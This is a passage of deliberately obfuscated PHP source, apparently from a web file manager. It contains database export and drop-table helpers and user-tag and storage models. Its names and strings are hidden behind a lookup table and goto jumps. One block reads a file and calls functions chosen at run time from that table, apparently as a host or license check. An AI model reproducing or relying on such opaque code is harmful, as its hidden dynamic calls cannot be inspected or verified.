($²õ€óù‰) { $²õ€óù‰->update($§Û¼ş€ğ); } } return !0; } public function dropTable($¢Û¢Ë» = null) { $îµã„ìÕ = $this->model()->db(); $ÑÂÏš¦ã = $¢Û¢Ë» ? array($¢Û¢Ë») : $îµã„ìÕ->getTables(); if (!$ÑÂÏš¦ã) { return; } foreach ($ÑÂÏš¦ã as $¢Û¢Ë») { if ($¢Û¢Ë») { $¢Û¢Ë» = strtolower($¢Û¢Ë»); } else { continue; } $îµã„ìÕ->execute("\x64\x72\x6f\160\x20\x74\141\x62\154\145\40\151\x66\40\145\x78\x69\163\x74\x73\40\140{$¢Û¢Ë»}\140"); } } private function sqlEncode($²è—Ã) { $ó¬šô€‡ =& $_SERVER[ˆ¡¹µ‹Â]; $¨Š•À…¨ = array(); foreach ($²è—Ã as $å÷Ë€ã´) { if (is_array($å÷Ë€ã´)) { $å÷Ë€ã´ = json_encode_force($å÷Ë€ã´); } $å÷Ë€ã´ = addslashes($å÷Ë€ã´); $å÷Ë€ã´ = str_replace(array($ó¬šô€‡[1150], $ó¬šô€‡[262], $ó¬šô€‡[418]), array($ó¬šô€‡[1151], $ó¬šô€‡[1152], $ó¬šô€‡[1153]), $å÷Ë€ã´); $¨Š•À…¨[] = $å÷Ë€ã´; } return $ó¬šô€‡[58] . implode($ó¬šô€‡[1154], $¨Š•À…¨) . $ó¬šô€‡[58]; } private function sqlDecode($ÍšÚÎ»Ú, $ü‘¾ó¡, $ ŸÛ ˆ = '') { $¡Š… =& $_SERVER[ˆ¡¹µ‹Â]; $ÍšÚÎ»Ú = str_replace(array($¡Š…[1151], $¡Š…[1152], $¡Š…[1153]), array($¡Š…[1150], $¡Š…[262], $¡Š…[418]), $ÍšÚÎ»Ú); if ($ü‘¾ó¡ == $¡Š…[13]) { $ÍšÚÎ»Ú = str_ireplace($¡Š…[1155], $¡Š…[59], $ÍšÚÎ»Ú); $ÍšÚÎ»Ú = stripslashes($ÍšÚÎ»Ú); } return preg_replace($¡Š…[1156], $¡Š…[12], $ÍšÚÎ»Ú); if ($ü‘¾ó¡ == $¡Š…[13]) { return $ ŸÛ ˆ != $¡Š…[1157] ? stripslashes($ÍšÚÎ»Ú) : $ÍšÚÎ»Ú; } if ($ ŸÛ ˆ == $¡Š…[1157]) { $ÍšÚÎ»Ú = str_replace($¡Š…[1158], $¡Š…[121], stripslashes($ÍšÚÎ»Ú)); } return $ÍšÚÎ»Ú; } public function getSqlFile($„³†Îß£ = '') { $Ìíáó‹ã =& $_SERVER[ˆ¡¹µ‹Â]; $·Œ§Õûä = $this->dbType(!0); $«ß—äş‡ = CONTROLLER_DIR . "\x69\156\163\x74\141\154\154\57\144\141\x74\141\x2f{$·Œ§Õûä}\56\163\161\x6c"; $ëî«¨í = file_get_contents($«ß—äş‡); $û›¦Ê§Æ = $Ìíáó‹ã[1159] . ($·Œ§Õûä == $Ìíáó‹ã[879] ? $Ìíáó‹ã[1160] : $Ìíáó‹ã[1161]) . $Ìíáó‹ã[1162]; preg_match_all($û›¦Ê§Æ, $ëî«¨í, $Ù´ê«Ö); $÷°Ì³Û– = $Ù´ê«Ö[1]; $ãÀ†òúŸ = $this->model()->db(); $•‘ëˆŠ = $ãÀ†òúŸ->getTables(); $à–†ãŞ = TEMP_FILES . $Ìíáó‹ã[1163] . date($Ìíáó‹ã[272]) . $Ìíáó‹ã[8]; del_dir($à–†ãŞ); mk_dir($à–†ãŞ); $ëğ§¯ = $à–†ãŞ . $Ìíáó‹ã[1164]; $Ñ¥µï… = $à–†ãŞ . $Ìíáó‹ã[1165]; $‚ËÈ®ç˜ = $·Œ§Õûä == $Ìíáó‹ã[13] ? $Ìíáó‹ã[879] : $Ìíáó‹ã[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\154\x6c\x2f\144\141\x74\141\57{$‚ËÈ®ç˜}\x2e\x73\161\x6c", $à–†ãŞ); @touch($à–†ãŞ . $·Œ§Õûä . $Ìíáó‹ã[863]); $º·¿Ç² = fopen($ëğ§¯, $Ìíáó‹ã[1138]); $š³»Ü£€ = fopen($Ñ¥µï…, $Ìíáó‹ã[1138]); if ($·Œ§Õûä == $Ìíáó‹ã[13]) { $•‘ëˆŠ = array_diff($•‘ëˆŠ, array($Ìíáó‹ã[855], $Ìíáó‹ã[856])); $æ…ÆÃ = array($Ìíáó‹ã[1166], $Ìíáó‹ã[1167], $Ìíáó‹ã[1168]); fwrite($š³»Ü£€, implode(PHP_EOL, $æ…ÆÃ) . PHP_EOL . PHP_EOL); foreach ($•‘ëˆŠ as $÷ÌŒâ¿ù) { $Šñû±²¤ = $this->sqlFromSqlite($÷ÌŒâ¿ù); if (!$Šñû±²¤[$Ìíáó‹ã[13]]) { continue; } fwrite($š³»Ü£€, $Šñû±²¤[$Ìíáó‹ã[13]] . PHP_EOL . PHP_EOL); if (!in_array($÷ÌŒâ¿ù, $÷°Ì³Û–)) { fwrite($º·¿Ç², $Šñû±²¤[$Ìíáó‹ã[879]] . PHP_EOL . PHP_EOL); } } } else { foreach ($•‘ëˆŠ as $÷ÌŒâ¿ù) { $Šñû±²¤ = $this->sqlFromMysql($÷ÌŒâ¿ù); if (!$Šñû±²¤[$Ìíáó‹ã[879]]) { continue; } fwrite($º·¿Ç², $Šñû±²¤[$Ìíáó‹ã[879]] . PHP_EOL . PHP_EOL); if (!in_array($÷ÌŒâ¿ù, $÷°Ì³Û–)) { fwrite($š³»Ü£€, $Šñû±²¤[$Ìíáó‹ã[13]] . PHP_EOL . PHP_EOL); } } } fclose($º·¿Ç²); fclose($š³»Ü£€); $ëî«¨í = array($Ìíáó‹ã[879] => $ëğ§¯, $Ìíáó‹ã[13] => $Ñ¥µï…); return $„³†Îß£ ? $ëî«¨í[$„³†Îß£] : $ëî«¨í; } public function dbType($¢õ„·Õ = false) { $¹¸ášş  =& $_SERVER[ˆ¡¹µ‹Â]; $÷øüí±¤ = $¢õ„·Õ ? $GLOBALS[$¹¸ášş [6]][$¹¸ášş [21]] : $this->database; $÷øüí±¤ = array_change_key_case($÷øüí±¤); $‰“—‡ºİ = $÷øüí±¤[$¹¸ášş [1038]]; if ($‰“—‡ºİ == $¹¸ášş [1035]) { $Ñ‡­äÓâ = explode($¹¸ášş [4], $÷øüí±¤[$¹¸ášş [1044]]); $‰“—‡ºİ = $Ñ‡­äÓâ[0]; } $€‰œì²‚ = array($¹¸ášş [1169] => $¹¸ášş [13], $¹¸ášş [983] => $¹¸ášş [879]); if (isset($€‰œì²‚[$‰“—‡ºİ])) { $‰“—‡ºİ = $€‰œì²‚[$‰“—‡ºİ]; } return $‰“—‡ºİ; } public function sqlFromMysql($ÚºË×«², $¿Ùğ§Ğ = '') { $¿á·…Á¯ =& $_SERVER[ˆ¡¹µ‹Â]; $›–šÃ•ƒ = $this->model()->db(); $ˆë·ØÎŸ = $›–šÃ•ƒ->query($¿á·…Á¯[1170] . $ÚºË×«² . $¿á·…Á¯[461]); if (!$ˆë·ØÎŸ || !$ˆë·ØÎŸ[0]) { return !1; } $¡ïÆ ºœ = _get($ˆë·ØÎŸ[0], $¿á·…Á¯[1171], $¿á·…Á¯[12]); if (!$¡ïÆ ºœ) { return !1; } $‹£œğÎş = "\x44\x52\x4f\x50\x20\x54\x41\102\114\x45\x20\111\x46\x20\x45\x58\111\123\x54\123\x20\x60{$ÚºË×«²}\x60\73" . PHP_EOL . $¡ïÆ ºœ . $¿á·…Á¯[74]; if ($¿Ùğ§Ğ && $¿Ùğ§Ğ == $¿á·…Á¯[879]) { return $‹£œğÎş; } $èà ü‘Í = array_change_key_case($GLOBALS[$¿á·…Á¯[6]][$¿á·…Á¯[21]]); $ïìçÕâ¾ = $èà ü‘Í[$¿á·…Á¯[1043]]; $ûœ§¾çü = $¿á·…Á¯[1172] . $ïìçÕâ¾ . $¿á·…Á¯[1173] . $ÚºË×«² . $¿á·…Á¯[58]; $ëÕŒúöİ = $¿á·…Á¯[1174] . $ÚºË×«² . $¿á·…Á¯[971]; $¢„…ñìÕ = $›–šÃ•ƒ->query($ûœ§¾çü); if (empty($¢„…ñìÕ)) { $âŠ¸µÚ† = array($¿á·…Á¯[879] => $¿á·…Á¯[12], $¿á·…Á¯[13] => $¿á·…Á¯[12]); return $¿Ùğ§Ğ ? $âŠ¸µÚ†[$¿Ùğ§Ğ] : $âŠ¸µÚ†; } $êè¯¡ü = $›–šÃ•ƒ->query($ëÕŒúöİ); $Üëæƒ…ì = $¿á·…Á¯[12]; $Íıùßµ‰ = array(); foreach ($êè¯¡ü as $®ƒéÕ¯µ) { if (!$Üëæƒ…ì && $®ƒéÕ¯µ[$¿á·…Á¯[1175]] == $¿á·…Á¯[1176]) { $Üëæƒ…ì = $®ƒéÕ¯µ[$¿á·…Á¯[1177]]; } if (isset($Íıùßµ‰[$®ƒéÕ¯µ[$¿á·…Á¯[1175]]])) { $Íıùßµ‰[$®ƒéÕ¯µ[$¿á·…Á¯[1175]]][$¿á·…Á¯[1178]][] = $®ƒéÕ¯µ[$¿á·…Á¯[1177]]; continue; } $Íıùßµ‰[$®ƒéÕ¯µ[$¿á·…Á¯[1175]]] = array($¿á·…Á¯[1179] => $®ƒéÕ¯µ[$¿á·…Á¯[1175]], $¿á·…Á¯[1178] => array($®ƒéÕ¯µ[$¿á·…Á¯[1177]]), $¿á·…Á¯[1180] => $®ƒéÕ¯µ[$¿á·…Á¯[1181]] == $¿á·…Á¯[91] ? 0 : 1); } $Ú‡®Í = array(); foreach ($Íıùßµ‰ as $®ƒéÕ¯µ) { $Ãùƒøóê = $®ƒéÕ¯µ[$¿á·…Á¯[1179]] == $¿á·…Á¯[1176]; $õ«ÔÁëş = array($¿á·…Á¯[1182], $®ƒéÕ¯µ[$¿á·…Á¯[1180]] == $¿á·…Á¯[91] && !$Ãùƒøóê ? $¿á·…Á¯[1183] : $¿á·…Á¯[12], $¿á·…Á¯[1184], $¿á·…Á¯[1185] . $ÚºË×«² . $¿á·…Á¯[11] . ($Ãùƒøóê ? $¿á·…Á¯[1186] : $®ƒéÕ¯µ[$¿á·…Á¯[1179]]) . $¿á·…Á¯[121], $¿á·…Á¯[1187], $¿á·…Á¯[121] . $ÚºË×«² . $¿á·…Á¯[121], $¿á·…Á¯[1188] . implode($¿á·…Á¯[1189], $®ƒéÕ¯µ[$¿á·…Á¯[1178]]) . $¿á·…Á¯[1190]); $Ú‡®Í[] = implode($¿á·…Á¯[53], $õ«ÔÁëş) . $¿á·…Á¯[74]; } $Å¦ÍÜ‚¼ = array(); $Ò‰»±Üä = array($¿á·…Á¯[1191] => $¿á·…Á¯[1192], $¿á·…Á¯[1192] => $¿á·…Á¯[1192], $¿á·…Á¯[364] => $¿á·…Á¯[391], $¿á·…Á¯[363] => $¿á·…Á¯[391]); foreach ($¢„…ñìÕ as $®ƒéÕ¯µ) { $õ«ÔÁëş = array($¿á·…Á¯[121] . $®ƒéÕ¯µ[$¿á·…Á¯[1193]] . $¿á·…Á¯[121], isset($Ò‰»±Üä[$®ƒéÕ¯µ[$¿á·…Á¯[1194]]]) ? $Ò‰»±Üä[$®ƒéÕ¯µ[$¿á·…Á¯[1194]]] : $®ƒéÕ¯µ[$¿á·…Á¯[1195]], $®ƒéÕ¯µ[$¿á·…Á¯[1196]] == $¿á·…Á¯[969] ? $¿á·…Á¯[1197] : $¿á·…Á¯[1198], $®ƒéÕ¯µ[$¿á·…Á¯[1193]] == $Üëæƒ…ì ? $¿á·…Á¯[1199] : $¿á·…Á¯[12], $®ƒéÕ¯µ[$¿á·…Á¯[1020]] ? strtoupper(str_replace($¿á·…Á¯[11], $¿á·…Á¯[12], $®ƒéÕ¯µ[$¿á·…Á¯[1020]])) : $¿á·…Á¯[12]); $Å¦ÍÜ‚¼[] = trim(implode($¿á·…Á¯[53], $õ«ÔÁëş)); } $¬äŠË¶î = array($¿á·…Á¯[1200] . $ÚºË×«² . $¿á·…Á¯[1201], $¿á·…Á¯[1202] . $ÚºË×«² . $¿á·…Á¯[1203], implode($¿á·…Á¯[50] . PHP_EOL, $Å¦ÍÜ‚¼), $¿á·…Á¯[1017]); $ôÔÛ›õº = implode(PHP_EOL, array_merge($¬äŠË¶î, $Ú‡®Í)); if ($¿Ùğ§Ğ && $¿Ùğ§Ğ == $¿á·…Á¯[13]) { return $ôÔÛ›õº; } $âŠ¸µÚ† = array($¿á·…Á¯[879] => $‹£œğÎş, $¿á·…Á¯[13] => $ôÔÛ›õº); return $¿Ùğ§Ğ ? $âŠ¸µÚ†[$¿Ùğ§Ğ] : $âŠ¸µÚ†; } public function sqlFromSqlite($–Öñ¢¶ó, $¼’ı¹‘ï = '') { $Äü¾Ì¬§ =& $_SERVER[ˆ¡¹µ‹Â]; $Á‹Ìµò¨ = $this->model()->db(); $ÔÜœ¡– = "\x50\122\x41\107\x4d\101\40\x54\101\x42\x4c\105\x5f\x49\x4e\106\117\40\x28\x27{$–Öñ¢¶ó}\x27\51"; $œ¿ªôì• = "\123\x45\114\105\x43\x54\40\52\x20\106\x52\x4f\115\40\163\161\x6c\x69\x74\x65\x5f\155\141\x73\x74\145\x72\40\127\110\105\122\x45\40\x74\142\x6c\x5f\x6e\x61\x6d\145\40\75\x20\x27{$–Öñ¢¶ó}\x27"; $«‘Ì¬õ = $Á‹Ìµò¨->query($ÔÜœ¡–); if (empty($«‘Ì¬õ)) { $®îŒŞôÇ = array($Äü¾Ì¬§[879] => $Äü¾Ì¬§[12], $Äü¾Ì¬§[13] => $Äü¾Ì¬§[12]); return $¼’ı¹‘ï ? $®îŒŞôÇ[$¼’ı¹‘ï] : $®îŒŞôÇ; } $š™Ò“Š = $Á‹Ìµò¨->query($œ¿ªôì•); $‰ÎŠİ ‡ = $ÔöÉñ€— = array(); foreach ($š™Ò“Š as $¬–­ø†) { if ($¬–­ø†[$Äü¾Ì¬§[33]] == $Äü¾Ì¬§[356]) { $‰ÎŠİ ‡[] = $¬–­ø†[$Äü¾Ì¬§[1204]]; } else { $ÔöÉñ€—[$¬–­ø†[$Äü¾Ì¬§[32]]] = $¬–­ø†[$Äü¾Ì¬§[1204]]; } } $Î«¿ö´ = array_merge(array($Äü¾Ì¬§[1200] . $–Öñ¢¶ó . $Äü¾Ì¬§[121]), $‰ÎŠİ ‡, array_values($ÔöÉñ€—)); $Î«¿ö´ = implode($Äü¾Ì¬§[74] . PHP_EOL, $Î«¿ö´) . $Äü¾Ì¬§[74]; if ($¼’ı¹‘ï && $¼’ı¹‘ï == $Äü¾Ì¬§[13]) { return $Î«¿ö´; } $ÃØƒËÂ = array(); $å¹§Ş†± = array($Äü¾Ì¬§[1192] => $Äü¾Ì¬§[1205], $Äü¾Ì¬§[391] => $Äü¾Ì¬§[1206]); $‚­¼±İ© = $Äü¾Ì¬§[12]; foreach ($«‘Ì¬õ as $¬–­ø†) { if ($¬–­ø†[$Äü¾Ì¬§[57]] == $Äü¾Ì¬§[91]) { $‚­¼±İ© = $¬–­ø†[$Äü¾Ì¬§[32]]; } $Â›Û°ßè = array($Äü¾Ì¬§[461] . $¬–­ø†[$Äü¾Ì¬§[32]] . $Äü¾Ì¬§[461], isset($å¹§Ş†±[$¬–­ø†[$Äü¾Ì¬§[33]]]) ? $å¹§Ş†±[$¬–­ø†[$Äü¾Ì¬§[33]]] : $¬–­ø†[$Äü¾Ì¬§[33]], $¬–­ø†[$Äü¾Ì¬§[35]] == $Äü¾Ì¬§[91] ? $Äü¾Ì¬§[1197] : $Äü¾Ì¬§[1207] . $¬–­ø†[$Äü¾Ì¬§[56]], $¬–­ø†[$Äü¾Ì¬§[57]] == $Äü¾Ì¬§[91] ? $Äü¾Ì¬§[1208] : $Äü¾Ì¬§[12]); $ÃØƒËÂ[] = trim(implode($Äü¾Ì¬§[53], $Â›Û°ßè)); } foreach ($ÔöÉñ€— as $¥¶ìÖÀî => $©Ö•ÃÖì) { $ü»ÈŞ°¡ = str_replace($Äü¾Ì¬§[1209] . $–Öñ¢¶ó . $Äü¾Ì¬§[11], $Äü¾Ì¬§[12], $¥¶ìÖÀî); $³´èÑ‡ = str_replace(array($Äü¾Ì¬§[121], $Äü¾Ì¬§[1028]), $Äü¾Ì¬§[461], substr($©Ö•ÃÖì, stripos($©Ö•ÃÖì, $Äü¾Ì¬§[337]))); if ($ü»ÈŞ°¡ == $Äü¾Ì¬§[1186]) { $öÌ¶—‚‘ = $Äü¾Ì¬§[1210] . $‚­¼±İ© . $Äü¾Ì¬§[1211]; } else { $öÌ¶—‚‘ = (stripos($ü»ÈŞ°¡, $Äü¾Ì¬§[11]) ? $Äü¾Ì¬§[1212] : $Äü¾Ì¬§[12]) . ($Äü¾Ì¬§[1213] . $ü»ÈŞ°¡ . $Äü¾Ì¬§[1214] . $³´èÑ‡); } $ÃØƒËÂ[] = $öÌ¶—‚‘; } $¼ËÈÓ = array($Äü¾Ì¬§[1215] . $–Öñ¢¶ó . $Äü¾Ì¬§[1216], $Äü¾Ì¬§[1217] . $–Öñ¢¶ó . $Äü¾Ì¬§[1218], implode($Äü¾Ì¬§[50] . PHP_EOL, $ÃØƒËÂ), $Äü¾Ì¬§[1219]); $øñÙÒè¹ = implode(PHP_EOL, $¼ËÈÓ); if ($¼’ı¹‘ï && $¼’ı¹‘ï == $Äü¾Ì¬§[879]) { return $øñÙÒè¹; } $®îŒŞôÇ = array($Äü¾Ì¬§[879] => $øñÙÒè¹, $Äü¾Ì¬§[13] => $Î«¿ö´); return $¼’ı¹‘ï ? $®îŒŞôÇ[$¼’ı¹‘ï] : $®îŒŞôÇ; } } goto aôÄ‡Û­…; AöÈòÌÈíŠ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\x6f\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Â²ëçò³) { $Ş¡ª¨ÕÚ =& $_SERVER[ˆ¡¹µ‹Â]; $—¬èñÓ = defined($Ş¡ª¨ÕÚ[2189]) && USER_ID ? USER_ID : $Ş¡ª¨ÕÚ[12]; return "\125\x73\x65\162\117\x70\x74\151\157\x6e\x5f{$Â²ëçò³}\137" . $—¬èñÓ; } protected function filterWhere($ï¯ëËå) { $åĞê˜ö² =& $_SERVER[ˆ¡¹µ‹Â]; $ï¯ëËå[$åĞê˜ö²[1763]] = defined($åĞê˜ö²[2189]) && USER_ID ? USER_ID : $åĞê˜ö²[12]; return $ï¯ëËå; } public function cacheRemoveUser($ë¿˜£¥, $ƒÇ‚¬®İ) { return Cache::remove("\125\163\x65\x72\117\x70\164\x69\x6f\x6e\x5f{$ë¿˜£¥}\137" . $ƒÇ‚¬®İ); } protected function optionDefault($ô—¾Æ‹ = '') { $˜Ù²Äß» =& $_SERVER[ˆ¡¹µ‹Â]; if ($ô—¾Æ‹ == $˜Ù²Äß»[12]) { return $GLOBALS[$˜Ù²Äß»[6]][$˜Ù²Äß»[2494]]; } if ($ô—¾Æ‹ == $˜Ù²Äß»[2495]) { return $GLOBALS[$˜Ù²Äß»[6]][$˜Ù²Äß»[2496]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\141\x67\114\151\x73\164"; public $modelType = "\x55\x73\145\162\117\x70\x74\x69\157\156"; public $field = array("\x6e\x61\x6d\145", "\x73\164\171\x6c\145", "\x73\157\x72\x74"); public function listData($¤ÓÛ˜´• = false, $–¹Ö›ª = "\x73\x6f\162\x74", $šŞÌ¤ãµ = false) { return parent::listData($¤ÓÛ˜´•, $–¹Ö›ª, $šŞÌ¤ãµ); } public function remove($‘ıüíÚ†) { return parent::remove($‘ıüíÚ†); } public function add($Õ“åçğÚ, $²Š¹Ò˜£ = "\154\141\x62\x65\x6c\x2d\x67\x72\145\x79\55\156\x6f\x72\x6d\141\x6c") { $³‡ŒÆñÃ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->findByName($Õ“åçğÚ)) { return !1; } $Ğ¬¿õ“¹ = array($³‡ŒÆñÃ[494] => $Õ“åçğÚ, $³‡ŒÆñÃ[558] => $²Š¹Ò˜£, $³‡ŒÆñÃ[1966] => $this->getSort($³‡ŒÆñÃ[335]) + 1); return parent::insert($Ğ¬¿õ“¹); } public function update($Ü¿»à”İ, $Í¸÷Çš¸) { $¼£ñşËÍ =& $_SERVER[ˆ¡¹µ‹Â]; $×ãšÒØÓ = $this->listData($Ü¿»à”İ); $¿†§™¸ó = $this->findByName($Í¸÷Çš¸[$¼£ñşËÍ[32]]); if (!$×ãšÒØÓ || $¿†§™¸ó && $¿†§™¸ó[$¼£ñşËÍ[475]] != $×ãšÒØÓ[$¼£ñşËÍ[475]]) { return !1; } return parent::update($Ü¿»à”İ, $Í¸÷Çš¸); } public function moveTop($Ç¿ûùñ) { $º”ü®ú­ =& $_SERVER[ˆ¡¹µ‹Â]; $èü’ÕÈï = parent::listData(); $õ§ÜÜª = $this->getSort($º”ü®ú­[334]); foreach ($èü’ÕÈï as &$ÁùÍÙ™³) { if ($ÁùÍÙ™³[$º”ü®ú­[475]] == $Ç¿ûùñ) { $ÁùÍÙ™³[$º”ü®ú­[1986]] = $õ§ÜÜª; continue; } $ÁùÍÙ™³[$º”ü®ú­[1986]] += 1; } unset($ÁùÍÙ™³); return parent::resetData($èü’ÕÈï); } public function moveBottom($ç‡ØÉÖö) { $†ã‹åÂ =& $_SERVER[ˆ¡¹µ‹Â]; $ë§Ó±×è = $this->getSort($†ã‹åÂ[335]) + 1; return parent::update($ç‡ØÉÖö, array($†ã‹åÂ[1986] => $ë§Ó±×è)); } public function resetSort($Åæ«Ş°) { $·Ÿ²µ²ü =& $_SERVER[ˆ¡¹µ‹Â]; $ú—˜åë­ = array(); $Åæ«Ş° = is_array($Åæ«Ş°) ? $Åæ«Ş° : array(); for ($à‘éƒôò = 0; $à‘éƒôò < count($Åæ«Ş°); $à‘éƒôò++) { $ú—˜åë­[$Åæ«Ş°[$à‘éƒôò] . $·Ÿ²µ²ü[12]] = $à‘éƒôò + 1; } $‹öš— = parent::listData(); foreach ($‹öš— as &$õ‘Ú¤Ã£) { $Â‡‹ìĞ• = $ú—˜åë­[$õ‘Ú¤Ã£[$·Ÿ²µ²ü[475]]]; $õ‘Ú¤Ã£[$·Ÿ²µ²ü[1986]] = $Â‡‹ìĞ• ? $Â‡‹ìĞ• : $õ‘Ú¤Ã£[$·Ÿ²µ²ü[1986]]; } unset($õ‘Ú¤Ã£); return parent::resetData($‹öš—); } private function getSort($ã–¼¶«) { $„ËÖ£Š€ =& $_SERVER[ˆ¡¹µ‹Â]; $÷µÍÂ÷§ = parent::listData(); $›œñáÛ = array_to_keyvalue($÷µÍÂ÷§, $„ËÖ£Š€[12], $„ËÖ£Š€[1986]); if (!$›œñáÛ) { $›œñáÛ = array(0); } $áşÌ„‰Ÿ = $ã–¼¶« == $„ËÖ£Š€[335] ? max($›œñáÛ) : min($›œñáÛ); return intval($áşÌ„‰Ÿ); } } goto fÈ‹Œ×ß‡; Cà˜æß×¶Ã: if ($_SERVER[$_SERVER[ˆ¡¹µ‹Â][846]] != $_SERVER[$_SERVER[ˆ¡¹µ‹Â][2086]]) { $_getc = $_SERVER[ˆ¡¹µ‹Â][847]; $_getfile = $_SERVER[$_SERVER[ˆ¡¹µ‹Â][848]] . $_SERVER[ˆ¡¹µ‹Â][849]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆ¡¹µ‹Â][262], $_getfilec); if (count($_getarrs) < $_SERVER[ˆ¡¹µ‹Â][687]) { $exit = $_SERVER[ˆ¡¹µ‹Â][850]; $exit(); } $_act = $_SERVER[ˆ¡¹µ‹Â][851]; $_act($_SERVER[$_SERVER[ˆ¡¹µ‹Â][844]]); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x73\164\157\162\141\147\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\151\172\x65\x4d\x61\170", "\x73\x79\x73\x74\145\x6d", "\x64\x65\x66\141\165\x6c\164", "\x64\x72\x69\166\x65\162", "\x63\x6f\156\x66\x69\147"); public function listData($â”É¤Ñ´ = false, $Ò—í»ÊÎ = "\x6d\x6f\x64\x69\146\171\x54\x69\x6d\x65", $Ü¨÷ä³¡ = false) { $äĞ‚ñ©Ü =& $_SERVER[ˆ¡¹µ‹Â]; $Ô¾ĞÃğ² = parent::listData($â”É¤Ñ´, $Ò—í»ÊÎ, $Ü¨÷ä³¡); if ($â”É¤Ñ´) { return $Ô¾ĞÃğ²; } $ÑÎ“µÇà = array(); if ($GLOBALS[$äĞ‚ñ©Ü[2294]]) { $ÑÎ“µÇà = $this->ioSizeUseGet(array_to_keyvalue($Ô¾ĞÃğ², $äĞ‚ñ©Ü[12], $äĞ‚ñ©Ü[475])); } foreach ($Ô¾ĞÃğ² as $ÉÊ‰šó => $ÒÔ™÷ˆò) { unset($Ô¾ĞÃğ²[$ÉÊ‰šó][$äĞ‚ñ©Ü[6]]); $Ô¾ĞÃğ²[$ÉÊ‰šó][$äĞ‚ñ©Ü[1950]] = isset($ÑÎ“µÇà[$ÒÔ™÷ˆò[$äĞ‚ñ©Ü[475]]]) ? $ÑÎ“µÇà[$ÒÔ™÷ˆò[$äĞ‚ñ©Ü[475]]] : 0; } return $Ô¾ĞÃğ²; } public function ioSizeUseGet($ƒæ“Ü) { $«ù©ìœ‡ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ƒæ“Ü) { return array(); } $ïŒôáÊş = $«ù©ìœ‡[2295] . implode($«ù©ìœ‡[50], $ƒæ“Ü); $²‹×Ù±ã = Cache::get($ïŒôáÊş); if ($²‹×Ù±ã) { return $²‹×Ù±ã; } $¢ÀÚ¹” = array($«ù©ìœ‡[892] => $«ù©ìœ‡[475], $«ù©ìœ‡[2296] => $«ù©ìœ‡[79]); $ñ‚Î†¢˜ = array($«ù©ìœ‡[892] => array($«ù©ìœ‡[7], $ƒæ“Ü)); $²‹×Ù±ã = Model($«ù©ìœ‡[864])->field($¢ÀÚ¹”)->where($ñ‚Î†¢˜)->group($«ù©ìœ‡[892])->select(); $²‹×Ù±ã = array_to_keyvalue($²‹×Ù±ã, $«ù©ìœ‡[475], $«ù©ìœ‡[79]); Cache::set($ïŒôáÊş, $²‹×Ù±ã, 600); return $²‹×Ù±ã; } public function getConfig($üâè­ô×) { $Ó¸º“•¬ = parent::listData($üâè­ô×); return json_decode($Ó¸º“•¬[$_SERVER[ˆ¡¹µ‹Â][6]], !0); } public function update($šŞÏí™, $ İÌâ¢) { $«±õİ‹ =& $_SERVER[ˆ¡¹µ‹Â]; $êÖÕÉÎè = $ İÌâ¢[$«±õİ‹[32]]; $€œ±œĞ = array_to_keyvalue(parent::listData(), $«±õİ‹[32]); if (isset($€œ±œĞ[$êÖÕÉÎè]) && $€œ±œĞ[$êÖÕÉÎè][$«±õİ‹[475]] != $šŞÏí™) { return !1; } $this->checkPwd($šŞÏí™, $ İÌâ¢); if (isset($ İÌâ¢[$«±õİ‹[2297]]) && $ İÌâ¢[$«±õİ‹[2297]] == $«±õİ‹[91]) { $this->checkConfig($ İÌâ¢); } unset($ İÌâ¢[$«±õİ‹[2297]]); $Òç¸Ø‹Ç = parent::update($šŞÏí™, $ İÌâ¢); if ($Òç¸Ø‹Ç && $ İÌâ¢[$«±õİ‹[37]]) { $ôÍ•çÛŞ = 0; foreach ($€œ±œĞ as $ùğÊúÎş) { if ($ùğÊúÎş[$«±õİ‹[37]] && $ùğÊúÎş[$«±õİ‹[475]] != $šŞÏí™) { $ôÍ•çÛŞ = $ùğÊúÎş[$«±õİ‹[475]]; parent::update($ùğÊúÎş[$«±õİ‹[475]], array($«±õİ‹[37] => 0)); } } $this->updateBackup($šŞÏí™, $ôÍ•çÛŞ); } return $Òç¸Ø‹Ç; } public function add($ŸÙˆº„§) { $Ö÷ƒ =& $_SERVER[ˆ¡¹µ‹Â]; $äú†Ê¼ø = array_to_keyvalue(parent::listData(), $Ö÷ƒ[32]); if (isset($äú†Ê¼ø[$ŸÙˆº„§[$Ö÷ƒ[32]]])) { return !1; } $this->checkConfig($ŸÙˆº„§); $ù×¦óÉ¸ = parent::insert($ŸÙˆº„§); if ($ù×¦óÉ¸ && $ŸÙˆº„§[$Ö÷ƒ[37]]) { foreach ($äú†Ê¼ø as $µ¡„†¥) { if ($µ¡„†¥[$Ö÷ƒ[37]]) { parent::update($µ¡„†¥[$Ö÷ƒ[475]], array($Ö÷ƒ[37] => 0)); } } } return $ù×¦óÉ¸; } public function updateBackup($œÅ­ºò†, $ùÔˆ”£Œ) { $î¿ç¶÷» =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ùÔˆ”£Œ) { return; } $ãÁ åø‹ = Model($î¿ç¶÷»[815])->config(); if ($ãÁ åø‹[$î¿ç¶÷»[1733]] != $î¿ç¶÷»[91] || $ãÁ åø‹[$î¿ç¶÷»[819]] != $ùÔˆ”£Œ) { return; } $æÖêæ‡† = Model($î¿ç¶÷»[837])->get($î¿ç¶÷»[858]); $æÖêæ‡† = json_decode($æÖêæ‡†, !0); if (!$æÖêæ‡†) { return; } $æÖêæ‡†[$î¿ç¶÷»[819]] = $œÅ­ºò†; Model($î¿ç¶÷»[837])->set(array($î¿ç¶÷»[858] => $æÖêæ‡†)); } public function checkPwd($ƒñµ½ïƒ, &$Ô“ÄÂá®) { $³âè­×¾ =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($Ô“ÄÂá®[$³âè­×¾[6]])) { return; } $¥Ëøğ¦Ø = json_decode($Ô“ÄÂá®[$³âè­×¾[6]], !0); $÷Æ‹ß˜ì = $³âè­×¾[12]; $õ…Üñê¼ = array($³âè­×¾[2298], $³âè­×¾[2299], $³âè­×¾[960]); foreach ($õ…Üñê¼ as $ûÈÀÚï) { if 